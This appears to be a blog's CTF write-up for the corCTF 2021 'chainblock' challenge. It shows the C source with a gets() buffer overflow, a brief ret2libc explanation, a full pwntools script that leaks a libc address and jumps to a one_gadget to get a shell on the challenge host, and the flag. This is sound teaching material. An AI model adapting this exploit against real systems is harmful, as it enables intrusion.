+</span><span>	</span><span style="color:#ffa759;">char</span><span> buf[</span><span style="color:#ffcc66;">255</span><span>]</span><span style="color:#ccc9c2cc;">;
+</span><span>	</span><span style="color:#f28779;">printf</span><span>(</span><span style="color:#bae67e;">&quot;Please enter your name: &quot;</span><span>)</span><span style="color:#ccc9c2cc;">;
+</span><span>	</span><span style="color:#f28779;">gets</span><span>(buf)</span><span style="color:#ccc9c2cc;">;
+</span><span>	</span><span style="color:#ffa759;">if </span><span>(</span><span style="color:#f28779;">strcmp</span><span>(buf</span><span style="color:#ccc9c2cc;">,</span><span> name) </span><span style="color:#f29e74;">!= </span><span style="color:#ffcc66;">0</span><span>) {
+</span><span>		</span><span style="color:#f28779;">printf</span><span>(</span><span style="color:#bae67e;">&quot;KYC failed, wrong identity!</span><span style="color:#95e6cb;">\n</span><span style="color:#bae67e;">&quot;</span><span>)</span><span style="color:#ccc9c2cc;">;
+</span><span>		</span><span style="color:#ffa759;">return</span><span style="color:#ccc9c2cc;">;
+</span><span>	}
+</span><span>	</span><span style="color:#f28779;">printf</span><span>(</span><span style="color:#bae67e;">&quot;Hi </span><span style="color:#ffcc66;">%s</span><span style="color:#bae67e;">!</span><span style="color:#95e6cb;">\n</span><span style="color:#bae67e;">&quot;</span><span style="color:#ccc9c2cc;">,</span><span> name)</span><span style="color:#ccc9c2cc;">;
+</span><span>	</span><span style="color:#f28779;">printf</span><span>(</span><span style="color:#bae67e;">&quot;Your balance is </span><span style="color:#ffcc66;">%d</span><span style="color:#bae67e;"> chainblocks!</span><span style="color:#95e6cb;">\n</span><span style="color:#bae67e;">&quot;</span><span style="color:#ccc9c2cc;">,</span><span> balance)</span><span style="color:#ccc9c2cc;">;
+</span><span>}
+</span><span style="color:#ffa759;">int </span><span style="color:#ffd580;">main</span><span>() {
+</span><span>	</span><span style="color:#f28779;">setvbuf</span><span>(stdout</span><span style="color:#ccc9c2cc;">, </span><span style="color:#ffcc66;">NULL</span><span style="color:#ccc9c2cc;">,</span><span> _IONBF</span><span style="color:#ccc9c2cc;">, </span><span style="color:#ffcc66;">0</span><span>)</span><span style="color:#ccc9c2cc;">;
+</span><span>	</span><span style="color:#f28779;">printf</span><span>(</span><span style="color:#bae67e;">&quot;      ___           ___           ___                       ___     </span><span style="color:#95e6cb;">\n</span><span style="color:#bae67e;">&quot;</span><span>)</span><span style="color:#ccc9c2cc;">;
+</span><span>	</span><span style="color:#f28779;">printf</span><span>(</span><span style="color:#bae67e;">&quot;     /</span><span style="color:#95e6cb;">\\  \\</span><span style="color:#bae67e;">         /</span><span style="color:#95e6cb;">\\</span><span style="color:#bae67e;">__</span><span style="color:#95e6cb;">\\</span><span style="color:#bae67e;">         /</span><span style="color:#95e6cb;">\\  \\</span><span style="color:#bae67e;">          ___        /</span><span style="color:#95e6cb;">\\</span><span style="color:#bae67e;">__</span><span style="color:#95e6cb;">\\    \n</span><span style="color:#bae67e;">&quot;</span><span>)</span><span style="color:#ccc9c2cc;">;
+</span><span>	</span><span style="color:#f28779;">printf</span><span>(</span><span style="color:#bae67e;">&quot;    /::</span><span style="color:#95e6cb;">\\  \\</span><span style="color:#bae67e;">       /:/  /        /::</span><span style="color:#95e6cb;">\\  \\</span><span style="color:#bae67e;">        /</span><span style="color:#95e6cb;">\\  \\</span><span style="color:#bae67e;">      /::|  |   </span><span style="color:#95e6cb;">\n</span><span style="color:#bae67e;">&quot;</span><span>)</span><span style="color:#ccc9c2cc;">;
+</span><span>	</span><span style="color:#f28779;">printf</span><span>(</span><span style="color:#bae67e;">&quot;   /:/</span><span style="color:#95e6cb;">\\</span><span style="color:#bae67e;">:</span><span style="color:#95e6cb;">\\  \\</span><span style="color:#bae67e;">     /:/__/        /:/</span><span style="color:#95e6cb;">\\</span><span style="color:#bae67e;">:</span><span style="color:#95e6cb;">\\  \\       \\</span><span style="color:#bae67e;">:</span><span style="color:#95e6cb;">\\  \\</span><span style="color:#bae67e;">    /:|:|  |   </span><span style="color:#95e6cb;">\n</span><span style="color:#bae67e;">&quot;</span><span>)</span><span style="color:#ccc9c2cc;">;
+</span><span>	</span><span style="color:#f28779;">printf</span><span>(</span><span style="color:#bae67e;">&quot;  /:/  </span><span style="color:#95e6cb;">\\</span><span style="color:#bae67e;">:</span><span style="color:#95e6cb;">\\  \\</span><span style="color:#bae67e;">   /::</span><span style="color:#95e6cb;">\\  \\</span><span style="color:#bae67e;"> ___   /::</span><span style="color:#95e6cb;">\\</span><span style="color:#bae67e;">~</span><span style="color:#95e6cb;">\\</span><span style="color:#bae67e;">:</span><span style="color:#95e6cb;">\\  \\</span><span style="color:#bae67e;">      /::</span><span style="color:#95e6cb;">\\</span><span style="color:#bae67e;">__</span><span style="color:#95e6cb;">\\</span><span style="color:#bae67e;">  /:/|:|  |__ </span><span style="color:#95e6cb;">\n</span><span style="color:#bae67e;">&quot;</span><span>)</span><span style="color:#ccc9c2cc;">;
+</span><span>	</span><span style="color:#f28779;">printf</span><span>(</span><span style="color:#bae67e;">&quot; /:/__/ </span><span style="color:#95e6cb;">\\</span><span style="color:#bae67e;">:</span><span style="color:#95e6cb;">\\</span><span style="color:#bae67e;">__</span><span style="color:#95e6cb;">\\</span><span style="color:#bae67e;"> /:/</span><span style="color:#95e6cb;">\\</span><span style="color:#bae67e;">:</span><span style="color:#95e6cb;">\\</span><span style="color:#bae67e;">  /</span><span style="color:#95e6cb;">\\</span><span style="color:#bae67e;">__</span><span style="color:#95e6cb;">\\</span><span style="color:#bae67e;"> /:/</span><span style="color:#95e6cb;">\\</span><span style="color:#bae67e;">:</span><span style="color:#95e6cb;">\\ \\</span><span style="color:#bae67e;">:</span><span style="color:#95e6cb;">\\</span><span style="color:#bae67e;">__</span><span style="color:#95e6cb;">\\</span><span style="color:#bae67e;">  __/:/</span><span style="color:#95e6cb;">\\</span><span style="color:#bae67e;">/__/ /:/ |:| /</span><span style="color:#95e6cb;">\\</span><span style="color:#bae67e;">__</span><span style="color:#95e6cb;">\\\n</span><span style="color:#bae67e;">&quot;</span><span>)</span><span style="color:#ccc9c2cc;">;
+</span><span>	</span><span style="color:#f28779;">printf</span><span>(</span><span style="color:#bae67e;">&quot; </span><span style="color:#95e6cb;">\\</span><span style="color:#bae67e;">:</span><span style="color:#95e6cb;">\\  \\  \\</span><span style="color:#bae67e;">/__/ </span><span style="color:#95e6cb;">\\</span><span style="color:#bae67e;">/__</span><span style="color:#95e6cb;">\\</span><span style="color:#bae67e;">:</span><span style="color:#95e6cb;">\\</span><span style="color:#bae67e;">/:/  / </span><span style="color:#95e6cb;">\\</span><span style="color:#bae67e;">/__</span><span style="color:#95e6cb;">\\</span><span style="color:#bae67e;">:</span><span style="color:#95e6cb;">\\</span><span style="color:#bae67e;">/:/  / /</span><span style="color:#95e6cb;">\\</span><span style="color:#bae67e;">/:/  /    </span><span style="color:#95e6cb;">\\</span><span style="color:#bae67e;">/__|:|/:/  /</span><span style="color:#95e6cb;">\n</span><span style="color:#bae67e;">&quot;</span><span>)</span><span style="color:#ccc9c2cc;">;
+</span><span>	</span><span style="color:#f28779;">printf</span><span>(</span><span style="color:#bae67e;">&quot;  </span><span style="color:#95e6cb;">\\</span><span style="color:#bae67e;">:</span><span style="color:#95e6cb;">\\  \\            \\</span><span style="color:#bae67e;">::/  /       </span><span style="color:#95e6cb;">\\</span><span style="color:#bae67e;">::/  /  </span><span style="color:#95e6cb;">\\</span><span style="color:#bae67e;">::/__/         |:/:/  / </span><span style="color:#95e6cb;">\n</span><span style="color:#bae67e;">&quot;</span><span>)</span><span style="color:#ccc9c2cc;">;
+</span><span>	</span><span style="color:#f28779;">printf</span><span>(</span><span style="color:#bae67e;">&quot;   </span><span style="color:#95e6cb;">\\</span><span style="color:#bae67e;">:</span><span style="color:#95e6cb;">\\  \\</span><span style="color:#bae67e;">           /:/  /        /:/  /    </span><span style="color:#95e6cb;">\\</span><span style="color:#bae67e;">:</span><span style="color:#95e6cb;">\\</span><span style="color:#bae67e;">__</span><span style="color:#95e6cb;">\\</span><span style="color:#bae67e;">         |::/  /  </span><span style="color:#95e6cb;">\n</span><span style="color:#bae67e;">&quot;</span><span>)</span><span style="color:#ccc9c2cc;">;
+</span><span>	</span><span style="color:#f28779;">printf</span><span>(</span><span style="color:#bae67e;">&quot;    </span><span style="color:#95e6cb;">\\</span><span style="color:#bae67e;">:</span><span style="color:#95e6cb;">\\</span><span style="color:#bae67e;">__</span><span style="color:#95e6cb;">\\</span><span style="color:#bae67e;">         /:/  /        /:/  /      </span><span style="color:#95e6cb;">\\</span><span style="color:#bae67e;">/__/         /:/  /   </span><span style="color:#95e6cb;">\n</span><span style="color:#bae67e;">&quot;</span><span>)</span><span style="color:#ccc9c2cc;">;
+</span><span>	</span><span style="color:#f28779;">printf</span><span>(</span><span style="color:#bae67e;">&quot;     </span><span style="color:#95e6cb;">\\</span><span style="color:#bae67e;">/__/         </span><span style="color:#95e6cb;">\\</span><span style="color:#bae67e;">/__/         </span><span style="color:#95e6cb;">\\</span><span style="color:#bae67e;">/__/                     </span><span style="color:#95e6cb;">\\</span><span style="color:#bae67e;">/__/    </span><span style="color:#95e6cb;">\n</span><span style="color:#bae67e;">&quot;</span><span>)</span><span style="color:#ccc9c2cc;">;
+</span><span>	</span><span style="color:#f28779;">printf</span><span>(</span><span style="color:#bae67e;">&quot;      ___           ___       ___           ___           ___     </span><span style="color:#95e6cb;">\n</span><span style="color:#bae67e;">&quot;</span><span>)</span><span style="color:#ccc9c2cc;">;
+</span><span>	</span><span style="color:#f28779;">printf</span><span>(</span><span style="color:#bae67e;">&quot;     /</span><span style="color:#95e6cb;">\\  \\</span><span style="color:#bae67e;">         /</span><span style="color:#95e6cb;">\\</span><span style="color:#bae67e;">__</span><span style="color:#95e6cb;">\\</span><span style="color:#bae67e;">     /</span><span style="color:#95e6cb;">\\  \\</span><span style="color:#bae67e;">         /</span><span style="color:#95e6cb;">\\  \\</span><span style="color:#bae67e;">         /</span><span style="color:#95e6cb;">\\</span><span style="color:#bae67e;">__</span><span style="color:#95e6cb;">\\    \n</span><span style="color:#bae67e;">&quot;</span><span>)</span><span style="color:#ccc9c2cc;">;
+</span><span>	</span><span style="color:#f28779;">printf</span><span>(</span><span style="color:#bae67e;">&quot;    /::</span><span style="color:#95e6cb;">\\  \\</span><span style="color:#bae67e;">       /:/  /    /::</span><span style="color:#95e6cb;">\\  \\</span><span style="color:#bae67e;">       /::</span><span style="color:#95e6cb;">\\  \\</span><span style="color:#bae67e;">       /:/  /    </span><span style="color:#95e6cb;">\n</span><span style="color:#bae67e;">&quot;</span><span>)</span><span style="color:#ccc9c2cc;">;
+</span><span>	</span><span style="color:#f28779;">printf</span><span>(</span><span style="color:#bae67e;">&quot;   /:/</span><span style="color:#95e6cb;">\\</span><span style="color:#bae67e;">:</span><span style="color:#95e6cb;">\\  \\</span><span style="color:#bae67e;">     /:/  /    /:/</span><span style="color:#95e6cb;">\\</span><span style="color:#bae67e;">:</span><span style="color:#95e6cb;">\\  \\</span><span style="color:#bae67e;">     /:/</span><span style="color:#95e6cb;">\\</span><span style="color:#bae67e;">:</span><span style="color:#95e6cb;">\\  \\</span><span style="color:#bae67e;">     /:/__/     </span><span style="color:#95e6cb;">\n</span><span style="color:#bae67e;">&quot;</span><span>)</span><span style="color:#ccc9c2cc;">;
+</span><span>	</span><span style="color:#f28779;">printf</span><span>(</span><span style="color:#bae67e;">&quot;  /::</span><span style="color:#95e6cb;">\\</span><span style="color:#bae67e;">~</span><span style="color:#95e6cb;">\\</span><span style="color:#bae67e;">:</span><span style="color:#95e6cb;">\\</span><span style="color:#bae67e;">__</span><span style="color:#95e6cb;">\\</span><span style="color:#bae67e;">   /:/  /    /:/  </span><span style="color:#95e6cb;">\\</span><span style="color:#bae67e;">:</span><span style="color:#95e6cb;">\\  \\</span><span style="color:#bae67e;">   /:/  </span><span style="color:#95e6cb;">\\</span><span style="color:#bae67e;">:</span><span style="color:#95e6cb;">\\  \\</span><span style="color:#bae67e;">   /::</span><span style="color:#95e6cb;">\\</span><span style="color:#bae67e;">__</span><span style="color:#95e6cb;">\\</span><span style="color:#bae67e;">____ </span><span style="color:#95e6cb;">\n</span><span style="color:#bae67e;">&quot;</span><span>)</span><span style="color:#ccc9c2cc;">;
+</span><span>	</span><span style="color:#f28779;">printf</span><span>(</span><span style="color:#bae67e;">&quot; /:/</span><span style="color:#95e6cb;">\\</span><span style="color:#bae67e;">:</span><span style="color:#95e6cb;">\\ \\</span><span style="color:#bae67e;">:|__| /:/__/    /:/__/ </span><span style="color:#95e6cb;">\\</span><span style="color:#bae67e;">:</span><span style="color:#95e6cb;">\\</span><span style="color:#bae67e;">__</span><span style="color:#95e6cb;">\\</span><span style="color:#bae67e;"> /:/__/ </span><span style="color:#95e6cb;">\\</span><span style="color:#bae67e;">:</span><span style="color:#95e6cb;">\\</span><span style="color:#bae67e;">__</span><span style="color:#95e6cb;">\\</span><span style="color:#bae67e;"> /:/</span><span style="color:#95e6cb;">\\</span><span style="color:#bae67e;">:::::</span><span style="color:#95e6cb;">\\</span><span style="color:#bae67e;">__</span><span style="color:#95e6cb;">\\\n</span><span style="color:#bae67e;">&quot;</span><span>)</span><span style="color:#ccc9c2cc;">;
+</span><span>	</span><span style="color:#f28779;">printf</span><span>(</span><span style="color:#bae67e;">&quot; </span><span style="color:#95e6cb;">\\</span><span style="color:#bae67e;">:</span><span style="color:#95e6cb;">\\</span><span style="color:#bae67e;">~</span><span style="color:#95e6cb;">\\</span><span style="color:#bae67e;">:</span><span style="color:#95e6cb;">\\</span><span style="color:#bae67e;">/:/  / </span><span style="color:#95e6cb;">\\</span><span style="color:#bae67e;">:</span><span style="color:#95e6cb;">\\  \\    \\</span><span style="color:#bae67e;">:</span><span style="color:#95e6cb;">\\  \\</span><span style="color:#bae67e;"> /:/  / </span><span style="color:#95e6cb;">\\</span><span style="color:#bae67e;">:</span><span style="color:#95e6cb;">\\  \\  \\</span><span style="color:#bae67e;">/__/ </span><span style="color:#95e6cb;">\\</span><span style="color:#bae67e;">/_|:|~~|~   </span><span style="color:#95e6cb;">\n</span><span style="color:#bae67e;">&quot;</span><span>)</span><span style="color:#ccc9c2cc;">;
+</span><span>	</span><span style="color:#f28779;">printf</span><span>(</span><span style="color:#bae67e;">&quot;  </span><span style="color:#95e6cb;">\\</span><span style="color:#bae67e;">:</span><span style="color:#95e6cb;">\\ \\</span><span style="color:#bae67e;">::/  /   </span><span style="color:#95e6cb;">\\</span><span style="color:#bae67e;">:</span><span style="color:#95e6cb;">\\  \\    \\</span><span style="color:#bae67e;">:</span><span style="color:#95e6cb;">\\</span><span style="color:#bae67e;">  /:/  /   </span><span style="color:#95e6cb;">\\</span><span style="color:#bae67e;">:</span><span style="color:#95e6cb;">\\  \\</span><span style="color:#bae67e;">          |:|  |    </span><span style="color:#95e6cb;">\n</span><span style="color:#bae67e;">&quot;</span><span>)</span><span style="color:#ccc9c2cc;">;
+</span><span>	</span><span style="color:#f28779;">printf</span><span>(</span><span style="color:#bae67e;">&quot;   </span><span style="color:#95e6cb;">\\</span><span style="color:#bae67e;">:</span><span style="color:#95e6cb;">\\</span><span style="color:#bae67e;">/:/  /     </span><span style="color:#95e6cb;">\\</span><span style="color:#bae67e;">:</span><span style="color:#95e6cb;">\\  \\    \\</span><span style="color:#bae67e;">:</span><span style="color:#95e6cb;">\\</span><span style="color:#bae67e;">/:/  /     </span><span style="color:#95e6cb;">\\</span><span style="color:#bae67e;">:</span><span style="color:#95e6cb;">\\  \\</span><span style="color:#bae67e;">         |:|  |    </span><span style="color:#95e6cb;">\n</span><span style="color:#bae67e;">&quot;</span><span>)</span><span style="color:#ccc9c2cc;">;
+</span><span>	</span><span style="color:#f28779;">printf</span><span>(</span><span style="color:#bae67e;">&quot;    </span><span style="color:#95e6cb;">\\</span><span style="color:#bae67e;">::/__/       </span><span style="color:#95e6cb;">\\</span><span style="color:#bae67e;">:</span><span style="color:#95e6cb;">\\</span><span style="color:#bae67e;">__</span><span style="color:#95e6cb;">\\    \\</span><span style="color:#bae67e;">::/  /       </span><span style="color:#95e6cb;">\\</span><span style="color:#bae67e;">:</span><span style="color:#95e6cb;">\\</span><span style="color:#bae67e;">__</span><span style="color:#95e6cb;">\\</span><span style="color:#bae67e;">        |:|  |    </span><span style="color:#95e6cb;">\n</span><span style="color:#bae67e;">&quot;</span><span>)</span><span style="color:#ccc9c2cc;">;
+</span><span>	</span><span style="color:#f28779;">printf</span><span>(</span><span style="color:#bae67e;">&quot;     ~~            </span><span style="color:#95e6cb;">\\</span><span style="color:#bae67e;">/__/     </span><span style="color:#95e6cb;">\\</span><span style="color:#bae67e;">/__/         </span><span style="color:#95e6cb;">\\</span><span style="color:#bae67e;">/__/         </span><span style="color:#95e6cb;">\\</span><span style="color:#bae67e;">|__|    </span><span style="color:#95e6cb;">\n</span><span style="color:#bae67e;">&quot;</span><span>)</span><span style="color:#ccc9c2cc;">;
+</span><span>	</span><span style="color:#f28779;">printf</span><span>(</span><span style="color:#bae67e;">&quot;</span><span style="color:#95e6cb;">\n\n</span><span style="color:#bae67e;">&quot;</span><span>)</span><span style="color:#ccc9c2cc;">;
+</span><span>	</span><span style="color:#f28779;">printf</span><span>(</span><span style="color:#bae67e;">&quot;----------------------------------------------------------------------------------&quot;</span><span>)</span><span style="color:#ccc9c2cc;">;
+</span><span>	</span><span style="color:#f28779;">printf</span><span>(</span><span style="color:#bae67e;">&quot;</span><span style="color:#95e6cb;">\n\n</span><span style="color:#bae67e;">&quot;</span><span>)</span><span style="color:#ccc9c2cc;">;
+</span><span>	</span><span style="color:#f28779;">printf</span><span>(</span><span style="color:#bae67e;">&quot;Welcome to Chainblock, the world&#39;s most advanced chain of blocks.</span><span style="color:#95e6cb;">\n\n</span><span style="color:#bae67e;">&quot;</span><span>)</span><span style="color:#ccc9c2cc;">;
+</span><span>	</span><span style="color:#f28779;">printf</span><span>(</span><span style="color:#bae67e;">&quot;Chainblock is a unique company that combines cutting edge cloud</span><span style="color:#95e6cb;">\n</span><span style="color:#bae67e;">&quot;</span><span>)</span><span style="color:#ccc9c2cc;">;
+</span><span>	</span><span style="color:#f28779;">printf</span><span>(</span><span style="color:#bae67e;">&quot;technologies with high tech AI powered machine learning models</span><span style="color:#95e6cb;">\n</span><span style="color:#bae67e;">&quot;</span><span>)</span><span style="color:#ccc9c2cc;">;
+</span><span>	</span><span style="color:#f28779;">printf</span><span>(</span><span style="color:#bae67e;">&quot;to create a unique chain of blocks that learns by itself!</span><span style="color:#95e6cb;">\n\n</span><span style="color:#bae67e;">&quot;</span><span>)</span><span style="color:#ccc9c2cc;">;
+</span><span>	</span><span style="color:#f28779;">printf</span><span>(</span><span style="color:#bae67e;">&quot;Chainblock is also a highly secure platform that is unhackable by design.</span><span style="color:#95e6cb;">\n</span><span style="color:#bae67e;">&quot;</span><span>)</span><span style="color:#ccc9c2cc;">;
+</span><span>	</span><span style="color:#f28779;">printf</span><span>(</span><span style="color:#bae67e;">&quot;We use advanced technologies like NX bits and anti-hacking machine learning models</span><span style="color:#95e6cb;">\n</span><span style="color:#bae67e;">&quot;</span><span>)</span><span style="color:#ccc9c2cc;">;
+</span><span>	</span><span style="color:#f28779;">printf</span><span>(</span><span style="color:#bae67e;">&quot;to ensure that your money is safe and will always be safe!</span><span style="color:#95e6cb;">\n\n</span><span style="color:#bae67e;">&quot;</span><span>)</span><span style="color:#ccc9c2cc;">;
+</span><span>	</span><span style="color:#f28779;">printf</span><span>(</span><span style="color:#bae67e;">&quot;----------------------------------------------------------------------------------&quot;</span><span>)</span><span style="color:#ccc9c2cc;">;
+</span><span>	</span><span style="color:#f28779;">printf</span><span>(</span><span style="color:#bae67e;">&quot;</span><span style="color:#95e6cb;">\n\n</span><span style="color:#bae67e;">&quot;</span><span>)</span><span style="color:#ccc9c2cc;">;
+</span><span>	</span><span style="color:#f28779;">printf</span><span>(</span><span style="color:#bae67e;">&quot;For security reasons we require that you verify your identity.</span><span style="color:#95e6cb;">\n</span><span style="color:#bae67e;">&quot;</span><span>)</span><span style="color:#ccc9c2cc;">;
+</span><span>	</span><span style="color:#ffd580;">verify</span><span>()</span><span style="color:#ccc9c2cc;">;
+</span><span>}
+</span></code></pre>
+<p>The vulnerability is in the function verify, in the gets invocation. There isn't any useful code for shell or flag reading inside the binary, but we can override the return pointer and it's linked to libc so ret2libc is an option. I did a two step exploit which leaked a pointer into libc and returned back into the vulnerable function, and then using the calculated libc address to return onto a one_gadget.</p>
+<pre data-lang="python" style="background-color:#212733;color:#ccc9c2;" class="language-python "><code class="language-python" data-lang="python"><span style="font-style:italic;color:#5c6773;">##!/usr/bin/env python3
+</span><span style="color:#ffa759;">from </span><span>pwn </span><span style="color:#ffa759;">import </span><span style="color:#ffcc66;">*
+</span><span>exe </span><span style="color:#f29e74;">= </span><span style="color:#ffd580;">ELF</span><span>(</span><span style="color:#bae67e;">&quot;chainblock&quot;</span><span>)
+</span><span>libc </span><span style="color:#f29e74;">= </span><span style="color:#ffd580;">ELF</span><span>(</span><span style="color:#bae67e;">&quot;./libc.so.6&quot;</span><span>)
+</span><span>ld </span><span style="color:#f29e74;">= </span><span style="color:#ffd580;">ELF</span><span>(</span><span style="color:#bae67e;">&quot;./ld-linux-x86-64.so.2&quot;</span><span>)
+</span><span>POP_RDI_RET </span><span style="color:#f29e74;">= </span><span style="color:#ffd580;">p64</span><span>(</span><span style="color:#ffcc66;">0x401493</span><span>)
+</span><span>context</span><span style="color:#f29e74;">.</span><span>binary </span><span style="color:#f29e74;">= </span><span>exe
+</span><span>context</span><span style="color:#f29e74;">.</span><span>terminal </span><span style="color:#f29e74;">= </span><span style="color:#bae67e;">&quot;kitty&quot;
+</span><span style="color:#ffa759;">def </span><span style="color:#ffd580;">conn</span><span>():
+</span><span>    </span><span style="color:#ffa759;">if </span><span>args</span><span style="color:#f29e74;">.</span><span>REMOTE:
+</span><span>        </span><span style="color:#ffa759;">return </span><span style="color:#ffd580;">remote</span><span>(</span><span style="color:#bae67e;">&quot;pwn.be.ax&quot;</span><span style="color:#ccc9c2cc;">, </span><span style="color:#ffcc66;">5000</span><span>)
+</span><span>    </span><span style="color:#ffa759;">elif </span><span>args</span><span style="color:#f29e74;">.</span><span>GDB:
+</span><span>        </span><span style="color:#ffa759;">return </span><span>gdb</span><span style="color:#f29e74;">.</span><span style="color:#ffd580;">debug</span><span>([ld</span><span style="color:#f29e74;">.</span><span>path</span><span style="color:#ccc9c2cc;">, </span><span>exe</span><span style="color:#f29e74;">.</span><span>path]</span><span style="color:#ccc9c2cc;">, </span><span style="color:#ffcc66;">env</span><span style="color:#f29e74;">=</span><span>{</span><span style="color:#bae67e;">&quot;LD_PRELOAD&quot;</span><span style="color:#ccc9c2cc;">: </span><span>libc</span><span style="color:#f29e74;">.</span><span>path})
+</span><span>    </span><span style="color:#ffa759;">else</span><span>:
+</span><span>        </span><span style="color:#ffa759;">return </span><span style="color:#ffd580;">process</span><span>([ld</span><span style="color:#f29e74;">.</span><span>path</span><span style="color:#ccc9c2cc;">, </span><span>exe</span><span style="color:#f29e74;">.</span><span>path]</span><span style="color:#ccc9c2cc;">, </span><span style="color:#ffcc66;">env</span><span style="color:#f29e74;">=</span><span>{</span><span style="color:#bae67e;">&quot;LD_PRELOAD&quot;</span><span style="color:#ccc9c2cc;">: </span><span>libc</span><span style="color:#f29e74;">.</span><span>path})
+</span><span style="color:#ffa759;">def </span><span style="color:#ffd580;">main</span><span>():
+</span><span>    r </span><span style="color:#f29e74;">= </span><span style="color:#ffd580;">conn</span><span>()
+</span><span>    payload </span><span style="color:#f29e74;">= </span><span style="color:#ffd580;">flat</span><span>({
+</span><span>        </span><span style="color:#ffcc66;">264</span><span style="color:#ccc9c2cc;">: </span><span>POP_RDI_RET</span><span style="color:#ccc9c2cc;">,
+</span><span>        </span><span style="color:#ffcc66;">272</span><span style="color:#ccc9c2cc;">: </span><span style="color:#ffd580;">p64</span><span>(exe</span><span style="color:#f29e74;">.</span><span>symbols[</span><span style="color:#bae67e;">&#39;__libc_start_main&#39;</span><span>])</span><span style="color:#ccc9c2cc;">,
+</span><span>        </span><span style="color:#ffcc66;">280</span><span style="color:#ccc9c2cc;">: </span><span style="color:#ffd580;">p64</span><span>(exe</span><span style="color:#f29e74;">.</span><span>plt[</span><span style="color:#bae67e;">&#39;puts&#39;</span><span>])</span><span style="color:#ccc9c2cc;">,
+</span><span>        </span><span style="color:#ffcc66;">288</span><span style="color:#ccc9c2cc;">: </span><span style="color:#ffd580;">p64</span><span>(exe</span><span style="color:#f29e74;">.</span><span>symbols[</span><span style="color:#bae67e;">&#39;verify&#39;</span><span>])</span><span style="color:#ccc9c2cc;">,
+</span><span>    })
+</span><span>    r</span><span style="color:#f29e74;">.</span><span style="color:#ffd580;">sendline</span><span>(payload)
+</span><span>    r</span><span style="color:#f29e74;">.</span><span style="color:#ffd580;">recvuntil</span><span>(</span><span style="color:#ffa759;">b</span><span style="color:#bae67e;">&quot;identity!</span><span style="color:#95e6cb;">\n</span><span style="color:#bae67e;">&quot;</span><span>)
+</span><span>    libc_start_address </span><span style="color:#f29e74;">= </span><span style="font-style:italic;color:#5ccfe6;">int</span><span style="color:#f29e74;">.</span><span style="color:#ffd580;">from_bytes</span><span>(r</span><span style="color:#f29e74;">.</span><span style="color:#ffd580;">recvline</span><span>()</span><span style="color:#f29e74;">.</span><span style="color:#ffd580;">rstrip</span><span>()</span><span style="color:#ccc9c2cc;">, </span><span style="color:#ffcc66;">byteorder</span><span style="color:#f29e74;">=</span><span style="color:#bae67e;">&quot;little&quot;</span><span>)
+</span><span>    libc</span><span style="color:#f29e74;">.</span><span>address </span><span style="color:#f29e74;">= </span><span>libc_start_address </span><span style="color:#f29e74;">- </span><span>libc</span><span style="color:#f29e74;">.</span><span>sym[</span><span style="color:#bae67e;">&quot;__libc_start_main&quot;</span><span>]
+</span><span>    log</span><span style="color:#f29e74;">.</span><span style="color:#ffd580;">info</span><span>(</span><span style="color:#bae67e;">&quot;Address of libc </span><span style="color:#ffcc66;">%s </span><span style="color:#bae67e;">&quot; </span><span style="color:#f29e74;">% </span><span style="color:#f28779;">hex</span><span>(libc</span><span style="color:#f29e74;">.</span><span>address))
+</span><span>    payload </span><span style="color:#f29e74;">= </span><span style="color:#ffd580;">flat</span><span>({
+</span><span>        </span><span style="color:#ffcc66;">264</span><span style="color:#ccc9c2cc;">: </span><span style="color:#ffd580;">p64</span><span>(libc</span><span style="color:#f29e74;">.</span><span>address </span><span style="color:#f29e74;">+ </span><span style="color:#ffcc66;">0xde78f</span><span>) </span><span style="font-style:italic;color:#5c6773;"># one_gadget
+</span><span>    })
+</span><span>    r</span><span style="color:#f29e74;">.</span><span style="color:#ffd580;">sendline</span><span>(payload)
+</span><span>    </span><span style="font-style:italic;color:#5c6773;"># good luck pwning :)
+</span><span>    r</span><span style="color:#f29e74;">.</span><span style="color:#ffd580;">interactive</span><span>()
+</span><span style="color:#ffa759;">if </span><span>__name__ </span><span style="color:#f29e74;">== </span><span style="color:#bae67e;">&quot;__main__&quot;</span><span>:
+</span><span>    </span><span style="color:#ffd580;">main</span><span>()
+</span></code></pre>
+<p>The flag is corctf{mi11i0nt0k3n_1s_n0t_a_scam_r1ght}</p>
+
+    </div>
+
+    
+    <div class="article-info">
+        
+        <div class="article-date">22 August 2021</div>
+        
+        <div class="article-taxonomies">
+            
+            
+                <ul class="article-tags">
+                    
+                    <li><a href="https://tsheinen.github.io/tags/ctf-writeups/">#ctf-writeups</a></li>
+                    
+                </ul>
+            
+        </div>
+    </div>
+
+</article>
+
+<script>
+window.onscroll = function() {
+    if (window.innerHeight + window.pageYOffset >= document.body.offsetHeight) {
+        var count = 200;
+        var defaults = {
+          origin: { y: 0.7 }
+        };
+
+        function fire(particleRatio, opts) {
+          confetti(Object.assign({}, defaults, opts, {
+            particleCount: Math.floor(count * particleRatio)
+          }));
+        }
+
+        fire(0.25, {
+          spread: 26,
+          startVelocity: 55,
+        });
+        fire(0.2, {
+          spread: 60,
+        });
+        fire(0.35, {
+          spread: 100,
+          decay: 0.91,
+          scalar: 0.8
+        });
+        fire(0.1, {
+          spread: 120,
+          startVelocity: 25,
+          decay: 0.92,
+          scalar: 1.2
+        });
+        fire(0.1, {
+          spread: 120,
+          startVelocity: 45,
+        });
+    }
+}
+</script>
+<script type="text/javascript" src="/js/navbar.js"></script>
+
+
+        </main>
+        <footer>
+            
+            
+        </footer>
+    </div>
+
+
+
+    <details data-popover="up" style="right: 20px;top: 20px;">
+      <summary>
+		  <svg class="paint-roller" aria-hidden="true" focusable="false" data-prefix="fas" data-icon="paint-roller" class="svg-inline--fa fa-paint-roller fa-w-16" role="img" xmlns="http://www.w3.org/2000/svg" viewBox="0 0 512 512"><path fill="currentColor" d="M416 128V32c0-17.67-14.33-32-32-32H32C14.33 0 0 14.33 0 32v96c0 17.67 14.33 32 32 32h352c17.67 0 32-14.33 32-32zm32-64v128c0 17.67-14.33 32-32 32H256c-35.35 0-64 28.65-64 64v32c-17.67 0-32 14.33-32 32v128c0 17.67 14.33 32 32 32h64c17.67 0 32-14.33 32-32V352c0-17.67-14.33-32-32-32v-32h160c53.02 0 96-42.98 96-96v-64c0-35.35-28.65-64-64-64z"/></svg>
+      </summary>
+      <div class="swatch-container">
+          
+            <div class="swatch-child" onclick="setTheme('Dark')">
+                <div style="text-align: center;">
+                  <div data-theme=Dark class="swatch">
+                    <div style="height: 100%; width:25%; background-color: var(--background-color, #000000)"></div>
+                    <div style="height: 100%; width:25%; background-color: var(--foreground-color, #000000)"></div>
+                    <div style="height: 100%; width:25%; background-color: var(--highlight-color, #000000)"></div>
